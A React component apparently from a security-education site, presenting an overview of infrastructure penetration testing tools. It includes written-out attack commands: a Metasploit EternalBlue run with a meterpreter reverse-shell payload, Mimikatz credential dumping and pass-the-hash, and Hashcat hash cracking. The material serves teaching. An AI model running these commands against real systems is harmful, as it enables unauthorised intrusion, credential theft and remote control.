
import React from 'react';
import { Terminal, Shield, Server, Lock } from 'lucide-react';
import CodeExample from '@/components/CodeExample';

const InfraToolsSection: React.FC = () => {
  return (
    <section className="space-y-8">
      <div className="mb-8">
        <h2 className="text-3xl font-bold mb-6 flex items-center gap-2">
          <Terminal className="text-cybr-primary" />
          Infrastructure Penetration Testing Tools
        </h2>
        <p className="mb-4">
          Effective infrastructure penetration testing requires a variety of specialized tools
          for reconnaissance, vulnerability assessment, exploitation, and post-exploitation activities.
        </p>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-x-8 gap-y-10">
        {/* Network Discovery & Scanning */}
        <div className="card">
          <h3 className="text-xl font-bold mb-4 flex items-center gap-2">
            <Terminal className="text-cybr-primary h-5 w-5" />
            Network Discovery & Scanning
          </h3>
          <ul className="space-y-3">
            <li className="border-b border-cybr-muted pb-2">
              <div className="font-semibold">Nmap</div>
              <p className="text-sm mt-1">
                The industry standard for network discovery and security auditing. Used for port scanning,
                service enumeration, and OS fingerprinting.
              </p>
              <CodeExample
                language="bash"
                code={`# Basic scan
nmap 192.168.1.0/24

# Service version detection
nmap -sV -p 1-65535 192.168.1.1

# OS detection with scripts and traceroute
nmap -A 192.168.1.1

# Vulnerability scanning with scripts
nmap --script vuln 192.168.1.1`}
                title="Nmap Examples"
              />
            </li>
            <li className="border-b border-cybr-muted pb-2">
              <div className="font-semibold">Masscan</div>
              <p className="text-sm mt-1">
                Fast port scanner capable of scanning the entire internet in under 6 minutes.
              </p>
            </li>
            <li>
              <div className="font-semibold">Responder</div>
              <p className="text-sm mt-1">
                LLMNR, NBT-NS and MDNS poisoner that can capture authentication credentials from a network.
              </p>
            </li>
          </ul>
        </div>

        {/* Vulnerability Assessment */}
        <div className="card">
          <h3 className="text-xl font-bold mb-4 flex items-center gap-2">
            <Shield className="text-cybr-primary h-5 w-5" />
            Vulnerability Assessment
          </h3>
          <ul className="space-y-3">
            <li className="border-b border-cybr-muted pb-2">
              <div className="font-semibold">OpenVAS</div>
              <p className="text-sm mt-1">
                Open Vulnerability Assessment System - comprehensive vulnerability scanner.
              </p>
            </li>
            <li className="border-b border-cybr-muted pb-2">
              <div className="font-semibold">Nessus</div>
              <p className="text-sm mt-1">
                Commercial vulnerability scanner with extensive infrastructure testing capabilities.
              </p>
            </li>
            <li>
              <div className="font-semibold">Nexpose</div>
              <p className="text-sm mt-1">
                Vulnerability scanner from Rapid7 that checks for vulnerabilities, configurations, and controls.
              </p>
            </li>
          </ul>
        </div>

        {/* Exploitation Frameworks */}
        <div className="card">
          <h3 className="text-xl font-bold mb-4 flex items-center gap-2">
            <Terminal className="text-cybr-primary h-5 w-5" />
            Exploitation Frameworks
          </h3>
          <ul className="space-y-3">
            <li className="border-b border-cybr-muted pb-2">
              <div className="font-semibold">Metasploit Framework</div>
              <p className="text-sm mt-1">
                The most widely used exploitation framework, with hundreds of exploits for known vulnerabilities.
              </p>
              <CodeExample
                language="ruby"
                code={`# Start Metasploit console
msfconsole

# Search for exploits
search type:exploit platform:windows ms17-010

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set required options
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5

# Run the exploit
exploit`}
                title="Metasploit Basic Usage"
              />
            </li>
            <li className="border-b border-cybr-muted pb-2">
              <div className="font-semibold">PowerSploit</div>
              <p className="text-sm mt-1">
                PowerShell post-exploitation framework with modules for all phases of penetration testing.
              </p>
            </li>
            <li>
              <div className="font-semibold">Empire</div>
              <p className="text-sm mt-1">
                Post-exploitation framework with a pure PowerShell agent and Python C2 server.
              </p>
            </li>
          </ul>
        </div>

        {/* Active Directory Tools */}
        <div className="card">
          <h3 className="text-xl font-bold mb-4 flex items-center gap-2">
            <Server className="text-cybr-primary h-5 w-5" />
            Active Directory Assessment
          </h3>
          <ul className="space-y-3">
            <li className="border-b border-cybr-muted pb-2">
              <div className="font-semibold">BloodHound</div>
              <p className="text-sm mt-1">
                Graphical AD exploration tool for identifying attack paths and privilege escalation opportunities.
              </p>
            </li>
            <li className="border-b border-cybr-muted pb-2">
              <div className="font-semibold">PowerView</div>
              <p className="text-sm mt-1">
                PowerShell tool for AD reconnaissance and exploitation.
              </p>
            </li>
            <li>
              <div className="font-semibold">Mimikatz</div>
              <p className="text-sm mt-1">
                Tool for extracting plaintext passwords, hashes, and Kerberos tickets from memory.
              </p>
              <CodeExample
                language="powershell"
                code={`# Extract passwords from memory
sekurlsa::logonpasswords

# Dump hashes from the SAM
lsadump::sam

# Pass-the-Hash attack
sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:hash`}
                title="Mimikatz Commands"
              />
            </li>
          </ul>
        </div>

        {/* Privilege Escalation */}
        <div className="card">
          <h3 className="text-xl font-bold mb-4 flex items-center gap-2">
            <Lock className="text-cybr-primary h-5 w-5" />
            Privilege Escalation
          </h3>
          <ul className="space-y-3">
            <li className="border-b border-cybr-muted pb-2">
              <div className="font-semibold">Windows Privilege Escalation</div>
              <ul className="list-disc pl-4 text-sm mt-1">
                <li>PowerUp (PowerShell script to find common Windows privilege escalation vectors)</li>
                <li>BeRoot (Privilege escalation project for Windows)</li>
                <li>Windows-Exploit-Suggester (Suggests exploits based on patch levels)</li>
              </ul>
            </li>
            <li>
              <div className="font-semibold">Linux Privilege Escalation</div>
              <ul className="list-disc pl-4 text-sm mt-1">
                <li>LinPEAS (Linux Privilege Escalation Awesome Script)</li>
                <li>LinEnum (Scripted local Linux enumeration & privilege escalation checks)</li>
                <li>GTFOBins (Curated list of Unix binaries that can bypass local security restrictions)</li>
              </ul>
            </li>
          </ul>
        </div>

        {/* Password Attacks */}
        <div className="card">
          <h3 className="text-xl font-bold mb-4 flex items-center gap-2">
            <Terminal className="text-cybr-primary h-5 w-5" />
            Password Attacks
          </h3>
          <ul className="space-y-3">
            <li className="border-b border-cybr-muted pb-2">
              <div className="font-semibold">Hashcat</div>
              <p className="text-sm mt-1">
                Advanced password recovery utility with GPU acceleration support.
              </p>
              <CodeExample
                language="bash"
                code={`# Crack NTLM hash
hashcat -m 1000 -a 0 hashes.txt wordlist.txt

# Crack WPA/WPA2 handshake
hashcat -m 22000 -a 0 capture.hccapx wordlist.txt

# Rule-based attack
hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r rules/best64.rule`}
                title="Hashcat Examples"
              />
            </li>
            <li>
              <div className="font-semibold">John the Ripper</div>
              <p className="text-sm mt-1">
                Traditional password cracking tool supporting many hash types.
              </p>
            </li>
          </ul>
        </div>
      </div>

      <div className="card mt-6">
        <h3 className="text-xl font-bold mb-4">Infrastructure Testing Distributions</h3>
        <div className="space-y-4">
          <div>
            <h4 className="text-lg font-semibold">Kali Linux</h4>
            <p className="text-sm mt-1">
              Debian-derived Linux distribution designed for digital forensics and penetration testing.
              Includes hundreds of pre-installed tools for infrastructure security testing.
            </p>
          </div>
          <div>
            <h4 className="text-lg font-semibold">Parrot Security OS</h4>
            <p className="text-sm mt-1">
              Security-focused Linux distribution with a comprehensive set of penetration testing and
              privacy tools.
            </p>
          </div>
          <div>
            <h4 className="text-lg font-semibold">BlackArch Linux</h4>
            <p className="text-sm mt-1">
              Arch Linux-based distribution for security researchers with over 2,300 security tools.
            </p>
          </div>
        </div>
      </div>
    </section>
  );
};

export default InfraToolsSection;
